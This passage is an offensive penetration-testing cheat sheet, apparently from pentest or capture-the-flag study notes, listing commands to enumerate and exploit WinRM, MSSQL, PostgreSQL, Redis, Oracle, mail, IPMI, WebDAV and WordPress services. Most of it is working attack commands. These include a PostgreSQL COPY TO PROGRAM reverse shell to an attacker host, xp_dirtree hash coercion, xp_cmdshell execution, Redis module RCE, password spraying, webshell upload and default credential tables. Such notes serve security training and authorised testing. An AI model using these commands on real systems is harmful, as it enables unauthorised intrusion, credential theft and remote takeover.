## WinRM (5985, 5986)

```bash
evil-winrm -i <TARGET> -u <user> -p <pass>
evil-winrm -i <TARGET> -u <user> -H <NTLM_hash>
cme winrm <TARGET> -u <user> -p <pass> -x "whoami"
nmap -sV -sC <TARGET> -p5985,5986 --disable-arp-ping -n
```

## WMI (135)

```bash
wmiexec.py <DOMAIN>/<user>:<pass>@<TARGET> "whoami"
cme wmi <TARGET> -u <user> -p <pass> -x "whoami"
dcomexec.py <DOMAIN>/<user>:<pass>@<TARGET> "whoami"
```

***

## Databases

### MSSQL (1433)

```bash
impacket-mssqlclient <user>@<TARGET> -windows-auth
sudo nmap -p1433 -sV --script ms-sql-info,ms-sql-config,ms-sql-empty-password <TARGET>
cme mssql <TARGET> -u <user> -p <pass> -x "whoami"

# Inside mssqlclient
SQL> SELECT @@version
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# RID brute over MSSQL when SMB/LDAP is locked
netexec mssql <TARGET> -u '<USER>' -p '<PASS>' --rid-brute --local-auth

# Coerce the service account to authenticate to you → capture NTLMv2
sudo responder -I <INTERFACE> -v
SQL> EXEC xp_dirtree '\\<ATTACKER_IP>\share', 1, 1
hashcat -m 5600 mssql.hash /usr/share/wordlists/rockyou.txt
```

### MySQL (3306)

```bash
mysql -u <user> -p'<pass>' -h <TARGET>
mysql -h <TARGET> -u <user> -p'<pass>' --skip-ssl <db>          # force plaintext (older MariaDB)
sudo nmap <TARGET> -sV -sC -p3306 --script mysql-info,mysql-enum

# SQL
SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;
```

Credentials often live in web configs:

```bash
cat /var/www/html/wp-config.php
grep -r "password" /var/www/ --include="*.php" --include="*.conf" 2>/dev/null
cat /etc/zabbix/zabbix_server.conf | grep -i "dbpassword\|dbuser"
```

**Security-relevant settings:** `secure_file_priv` (file import/export paths), plaintext `password` in config.

### PostgreSQL (5432)

Superuser access = direct OS command execution. Often moved to a non-standard port (e.g. **5437**) — scan for it.

```bash
PGPASSWORD='<pass>' psql -h <TARGET> -U postgres -p <PORT>    # try postgres:postgres
# Inside psql: \l  \c <db>  \dt  \du   (look for Superuser)

# RCE as the postgres OS user (superuser only)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1"';

# Arbitrary file read
CREATE TABLE x(d text); COPY x FROM '/etc/passwd'; SELECT * FROM x;
```

### Redis (6379)

If `INFO` answers without `AUTH`, it's open — and Redis frequently runs as **root**.

```bash
redis-cli -h <TARGET> INFO
redis-cli -h <TARGET> CONFIG GET dir            # confirm write location + running user

# < 4.0: SSH-key write into a user's ~/.ssh/authorized_keys via CONFIG SET dir + dbfilename + SAVE
# 4.0+ : malicious module RCE
redis-cli -h <TARGET> MODULE LOAD /path/to/exp.so
redis-cli -h <TARGET> system.exec "id"
```

{% hint style="info" %}
Rogue-master / module-callback ports must be egress-allowed (80/443 on locked-down boxes). Drive Redis with one-shot `redis-cli <cmd>` — the interactive prompt can be buggy over these exploits.
{% endhint %}

### Oracle TNS (1521)

Default creds: Oracle 9 `CHANGE_ON_INSTALL`, DBSNMP `dbsnmp`.

```bash
sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute
./odat.py all -s <TARGET>                                    # full sweep
sqlplus <USER>/<PASS>@<TARGET>/<SID> as sysdba

# File upload via ODAT
./odat.py utlfile -s <TARGET> -d <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```sql
select table_name from all_tables;
select name, password from sys.user$;    -- legacy password hashes (needs sysdba)
```

***

## Mail Access — IMAP & POP3 (110, 143, 993, 995)

```bash
sudo nmap -sV -sC -p143,993,110,995 <TARGET> -Pn
openssl s_client -connect <TARGET>:143 -starttls imap
openssl s_client -connect <TARGET>:993 -crlf -quiet
a1 LOGIN <USER> <PASS>
a2 SELECT "INBOX"
a3 FETCH 1 BODY[]

# Manual POP3 read once you hold ONE password — the inbox is often the walkthrough
nc <TARGET> 110
  USER <USER>
  PASS <PASS>
  LIST
  RETR 1
  QUIT
```

**Credential reuse:** discovered passwords often work across multiple users (shared PAM/LDAP backend). Spray:

```bash
hydra -L <USERLIST> -p '<PASSWORD>' <TARGET> imap -V
curl -k "imaps://<TARGET>/INBOX" --user "<USER>:<PASSWORD>"
```

**Dangerous Dovecot settings:** `auth_debug_passwords` (logs passwords), `auth_anonymous_username` (anonymous SASL).

## IPMI (UDP 623)

Hardware management independent of the host OS. The RAKP flaw leaks a crackable hash *before* auth completes.

| Product | Default user | Default password |
| --------------- | ---------------- | -------------------------------------- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-char (digits + uppercase) |
| Supermicro | ADMIN | ADMIN |

```bash
sudo nmap -sU --script ipmi-version -p 623 <TARGET>
# MSF: use auxiliary/scanner/ipmi/ipmi_dumphashes
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u        # HP iLO default style
ipmitool -I lanplus -H <TARGET> -U <USER> -P <PASS> user list
```

## Finger (79)

A free username oracle on legacy Unix / mail-suite boxes — validate which names are real accounts before spending effort on SMTP/POP3/SSH.

```bash
finger <USER>@<TARGET>
echo '<USER>' | nc <TARGET> 79
for u in $(cat names.txt); do finger $u@<TARGET>; done | grep -v 'not known'
```

## Squid Proxy (3128)

An open forward proxy becomes an internal port scanner — reach services bound to the target's own loopback.

```bash
python3 spose.py --proxy http://<TARGET>:3128 --target 127.0.0.1
curl -x http://<TARGET>:3128 http://127.0.0.1:<PORT>/        # any non-error response = open internal port
```

## R-Services (512, 513, 514)

Trust-based auth via `/etc/hosts.equiv` and `~/.rhosts` — no password if trusted.

```bash
sudo nmap -sV -p 512,513,514 <TARGET>
rlogin <TARGET> -l <USER>            # 513
rsh <TARGET> -l <USER> <COMMAND>     # 514
rusers -al <TARGET>
```

## Rsync (873)

```bash
sudo nmap -sV -p 873 <TARGET>
rsync -av --list-only rsync://<TARGET>/           # list modules
rsync -av --list-only rsync://<TARGET>/dev        # list a module's contents
```

## Other UDP / discovery services

```bash
sudo nmap --script broadcast-dhcp-discover        # DHCP (67/68) — server, DNS, gateway
nbtscan -r 192.168.1.0/24                          # NBT-NS / NetBIOS (137)
nmblookup -A <TARGET>
mdns-scan                                          # mDNS (5353)
nc <TARGET> 1978                                   # Remote Mouse — "nop nop" = no password set
```

***

## WebDAV (on 80/443)

When `OPTIONS` returns `PROPFIND` / `MKCOL` / `PUT`, or `http-enum` flags `/webdav/`.

```bash
curl -X OPTIONS -i http://<TARGET>/webdav/           # look for Allow: PUT, MKCOL, PROPFIND
davtest -auth <USER>:<PASS> -url http://<TARGET>/webdav   # what extensions upload AND execute
cadaver http://<TARGET>/webdav
dav:/webdav/> put shell.aspx
```

Requires creds to write — brute-force is the usual way in. Upload a webshell matching the server (`.aspx` for IIS, `.php` for Apache). Full web mapping in [Web Enumeration](web-enumeration.md).

## WordPress (WPScan)

```bash
wpscan --url http://<TARGET> -e u,ap --plugins-detection aggressive
wpscan --url http://<TARGET> -e vp                                   # vulnerable plugins only
wpscan --url http://<TARGET> -U users.txt -P /usr/share/wordlists/rockyou.txt   # spray
```

## SSL/TLS Certificate Mining — do this on every HTTPS service

Certificates leak internal hostnames, domain names, CA server names, and internal IPs via Subject CN and Subject Alternative Names.

```bash
# Extract all DNS SANs — each is a vhost waiting to be added to /etc/hosts
openssl s_client -connect <TARGET>:443 2>/dev/null \
  | openssl x509 -noout -text \
  | grep -oP 'DNS:\K[^,\s]+' | sort -u

echo "<TARGET> <SAN1> <SAN2> <SAN3>" | sudo tee -a /etc/hosts
```

* **Subject CN** — internal FQDN (`mail.`, `intranet.`)
* **SAN** — internal hostnames/IPs = virtual hosts to add to `/etc/hosts`
* **Issuer CN** — CA server name (`<DOMAIN>-CA01-CA` reveals the CA and domain)

{% hint style="success" %}
Add every discovered hostname to `/etc/hosts`. Kerberos auth later needs names, not IPs — and vhost fuzzing needs the base name to fuzz against.
{% endhint %}

***

# AD-Adjacent Enumeration

Bridges into the domain flow — full detail in [Active Directory](AD.md) and [AD Attacks](ad-attacks.md).

## Password policy (before you spray)

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --pass-pol
rpcclient -U "" -N <TARGET>          # getdompwinfo
enum4linux -P <TARGET>
```

```powershell
net accounts
Get-DomainPolicy                     # PowerView
```

**Error codes:** `1326` wrong password | `1331` account disabled | `1909` locked out.
**Safe spray formula:** max sprays = Lockout Threshold − 2; wait = Reset Counter + 1 min.

## Security controls (Windows, post-foothold)

```powershell
Get-MpComputerStatus                                          # Defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode                   # Full vs Constrained
Get-LocalGroupMember -Group "Administrators"
```

## Domain trusts

```powershell
Get-ADTrust -Filter *                # built-in RSAT
Get-DomainTrustMapping               # PowerView
netdom query /domain:<DOMAIN> trust  # built-in
```

## Mass web app discovery & screenshotting

```bash
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
eyewitness --web -x web_discovery.xml -d output_directory
cat web_discovery.xml | aquatone -nmap -out aquatone_report
```

***

## AutoRecon — Orchestrated Multi-Tool Enumeration

For long single-target assessments where you want automated per-service surveying while you focus. It wraps common discovery tools such as nmap NSE, feroxbuster, enum4linux, smbmap, nikto, and snmpwalk.

```bash
pipx install git+https://github.com/Tib3rius/AutoRecon.git
sudo autorecon <TARGET>                                   # all services
sudo autorecon -t targets.txt
sudo autorecon <TARGET> --port-scan-profile top-100-ports # faster first pass
sudo autorecon <TARGET> --exclude-tags brute              # skip brute stages
```

Output lands under `results/<host>/scans/` (per-service raw output), `loot/`, and `report/notes.txt` (suggested follow-ups per service).

**Alternatives:** `rustscan -a <TARGET> -- -A -sC` (fastest sweep), nmapAutomator, Legion (GUI).

{% hint style="warning" %}
AutoRecon is a **survey tool, not a substitute for reading the raw output**. Always confirm a finding by hand before it goes in the report.
{% endhint %}

***

## Non-Standard Port Signals

A service moved off its default port is almost always intentional — the box author is pointing you at it. Never assume port == service; `whatweb` / `curl -sI` each one independently.

| Port | Usually | Intended path |
| ------------ | ---------------------- | ----------------------------------------------------- |
| 5437 | PostgreSQL (5432) | Default creds → `COPY FROM PROGRAM` RCE |
| 43022 | SSH | Hidden SSH — brute with known usernames |
| 2121 | FTP | Anonymous writable share |
| 8080 + 80 | Multiple HTTP | Each is a different app — probe both |
| 8081 | Nexus | Default `nexus:nexus` fallback |
| 8000 + 50000 | Werkzeug (Flask) | Dev-mode Python app issues |

***

## Quick Reference — Service → Tool

| Service | Port | Tool | Notes |
| -------- | ---- | -------------------------------- | ----------------------------- |
| FTP | 21 | `ftp`, `wget -m` | Check anonymous |
| SSH | 22 | `ssh-audit` | Weak algos, brute-force |
| SMTP | 25 | `telnet`, `smtp-user-enum` | User enum, relay |
| DNS | 53 | `dig`, `dnsenum`, `gobuster` | Zone transfer, subdomains |
| HTTP | 80 | `curl`, `ffuf` | Web fuzzing |
| RPC | 111 | `rpcclient`, `nmap` | SMB null session |
| SNMP | 161 | `snmpwalk`, `onesixtyone` | Community strings |
| LDAP | 389 | `ldapsearch`, `windapsearch` | Anonymous bind |
| SMB | 445 | `smbclient`, `cme`, `enum4linux` | Shares, users, groups |
| MSSQL | 1433 | `mssqlclient`, `cme` | SQL auth, RCE |
| Oracle | 1521 | `sqlplus`, `odat` | SID brute |
| NFS | 2049 | `showmount`, `mount` | Exported filesystems |
| MySQL | 3306 | `mysql` | Weak passwords |
| RDP | 3389 | `xfreerdp`, `cme` | Screenshots, auth |
| PostgreSQL | 5432 | `psql` | Superuser → RCE |
| WinRM | 5985 | `evil-winrm`, `cme` | PowerShell execution |
| Redis | 6379 | `redis-cli` | Unauth → RCE |

***

## Checklists

**Initial recon**

* [ ] Ping/ARP sweep to identify live hosts
* [ ] Fast SYN scan on all ports (`-p- --min-rate`)
* [ ] Version + default scripts on open ports (`-sV -sC`)
* [ ] UDP scan on top ports (DNS, SNMP, DHCP, TFTP)
* [ ] OS detection
* [ ] `searchsploit --nmap scan.xml` to triage versions

**Follow-up per service**

* [ ] Web → fuzzing + tech detection ([Web Enumeration](web-enumeration.md))
* [ ] DNS → zone transfer + subdomain enum
* [ ] SMB/RPC → null session, shares, RID cycling
* [ ] LDAP → anonymous bind, description fields
* [ ] SNMP → community brute, high-value OIDs
* [ ] HTTPS → SSL cert SAN mining → `/etc/hosts`
* [ ] DC signature spotted → pivot to [AD](AD.md)
* [ ] Landed creds → **re-run everything credentialed**

***

## Related

* [Web Enumeration](web-enumeration.md) — deep-dive on the HTTP/S attack surface you find here
* [Active Directory](AD.md) — where the DC port signature and LDAP/SMB findings lead
* [AD Attacks](ad-attacks.md) — Kerberoasting, AS-REP, relay, and the rest of the domain kill chain
* [Shells & Payloads](shells-payloads.md) — turning a service foothold into a shell
* [Report Writing](report-writing.md) — recording findings with CVSS and evidence as you go
